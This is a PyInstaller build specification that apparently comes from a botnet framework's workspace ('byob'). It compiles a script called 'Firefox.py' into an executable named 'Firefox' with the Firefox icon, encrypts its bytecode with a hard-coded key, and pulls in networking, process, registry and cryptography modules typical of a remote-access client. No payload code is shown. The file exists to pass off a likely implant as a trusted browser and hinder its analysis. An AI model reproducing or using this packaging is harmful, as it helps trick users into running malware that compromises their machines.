# -*- mode: python -*-
block_cipher = pyi_crypto.PyiBlockCipher(key='f2438g2t38zH;@NP')
a = Analysis(['Firefox.py'],
             pathex=['/Users/apple/byob/byob'],
             binaries=[],
             datas=[],
             hiddenimports=['base64', 'zlib', 'marshal', 'urllib', 'functools', 'random', 'subprocess', '_winreg', 'Crypto.Cipher.AES', 'struct', 'tempfile', 'Crypto.Hash.SHA256', 'base64', 'urllib', 'imp', 'json', 'collections', 'numpy', 'Crypto.Hash.HMAC', 'ftplib', 'zipfile', 'urllib2', 'sys', 'ctypes', 'contextlib', 'uuid', 'Crypto.Util', 'logging', 'socket', 'StringIO', 'zlib', 'threading', 'itertools', 'time', 'colorama', 'requests', 'os', 'marshal'],
             hookspath=[],
             runtime_hooks=[],
             excludes=['site'],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          name='Firefox',
          debug=False,
          strip=False,
          upx=False,
          runtime_tmpdir=None,
          console=True, icon='/Users/apple/Desktop/firefox.icns')
